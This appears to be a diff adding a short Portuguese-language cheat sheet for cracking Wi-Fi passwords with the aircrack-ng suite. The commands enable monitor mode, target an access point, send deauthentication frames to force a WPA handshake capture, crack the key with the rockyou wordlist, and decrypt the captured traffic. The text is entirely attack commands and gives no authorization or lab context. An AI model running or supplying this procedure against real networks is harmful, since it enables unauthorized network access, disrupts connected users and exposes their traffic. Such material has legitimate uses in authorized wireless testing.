@@ -1,0 +1,26 @@
+Procedimento básico:
+
+    # Colocando interface no modo monitor
+    airmon-ng check kill
+    airmon-ng start wlan0
+
+    # Monitorando redes
+    airodump-ng wlan0mon
+
+    # Monitorando rede especifica
+    airodump-ng wlan0mon -c 1 --bssid xx:xx:xx:xx:xx:xx -w saida
+
+    # Em outro terminal - Capturando handshake
+    aireplay-ng -0 10 -a <mac roteador> -c <mac cliente>
+
+    # Quebrando senha
+    aircrack-ng saida.cap -w /usr/share/wordlists/rockyou.txt
+
+    # Desativando interface monitor
+    airmon-ng stop wlan0mon
+    service network-manager start
+
+    # Descriptografar trafego capturado
+    airdecap-ng -p senha@123 saida.cap -e <nome da rede>
+
+:)
